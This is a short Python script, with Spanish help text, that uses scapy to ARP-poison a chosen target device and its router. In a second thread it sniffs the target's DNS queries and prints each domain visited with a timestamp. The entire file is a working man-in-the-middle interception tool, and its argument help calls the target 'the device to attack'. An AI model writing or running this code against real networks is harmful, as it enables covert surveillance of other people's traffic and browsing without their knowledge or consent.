import argparse
import threading
from colorama import init, Fore, Style
init(autoreset=True)
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS

parser = argparse.ArgumentParser(description='DNS sniffer')
parser.add_argument('--targetip', help='El dispositivo a atacar', required=True)

parser.add_argument('--iface', help='Interfaz de red', required=True )
parser.add_argument('--routerip', help='IP del router local', required=True)
opts = parser.parse_args()

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface
        
    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('Parece que la IP no esta activa, intentando de nuevo...')
                continue
                
    def capture(self):
        sniff(iface=self.iface, prn=self.dns, filter=f'src host {self.targetip} and udp port 53') 

    def dns(self,pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())
        t1.start()
        t2.start()

if __name__ == '__main__':
    device = Device(opts.routerip, opts.targetip, opts.iface)
    device.watch()
